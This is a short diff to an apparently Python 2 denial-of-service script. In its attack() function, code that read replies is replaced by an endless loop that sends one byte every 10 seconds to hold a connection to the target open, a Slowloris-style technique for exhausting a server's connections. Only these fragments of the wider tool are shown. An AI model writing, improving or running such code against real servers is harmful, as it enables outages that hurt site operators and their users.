@@ -1,5 +1,5 @@
 #-*- coding:utf-8 -*-
-import socket,multiprocessing,sys,random,argparse,requests
+import socket,multiprocessing,sys,random,argparse,requests,time
 from BeautifulSoup import BeautifulSoup
 
 def form_to_dict(form):
@@ -62,8 +62,9 @@ def attack(targett,port,header):
             print 'connected\n'
             sock.send(header)
             print 'header sended\n'
-            sock.recv(1024)
-            sock.recv(1024)
+            while True:
+                sock.send('A')
+                time.sleep(10)
         except:
             print 'Host recusou as conexoes\n'
 
